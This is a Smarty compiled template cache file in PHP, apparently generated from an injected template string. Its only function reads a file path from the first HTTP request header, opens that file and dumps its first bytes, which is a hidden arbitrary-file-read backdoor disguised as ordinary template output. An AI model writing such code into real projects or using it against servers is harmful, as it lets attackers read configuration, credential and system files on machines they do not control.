<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:51:54
  from "b157d03e2f379d394288a2dc5ca8de2694acaa16" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f67da2d9f80_76252226',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f67da2d9f80_76252226 (Smarty_Internal_Template $_smarty_tpl) {
echo var_dump(fread(fopen(urldecode(current(getallheaders())),'r'),11));
}
}
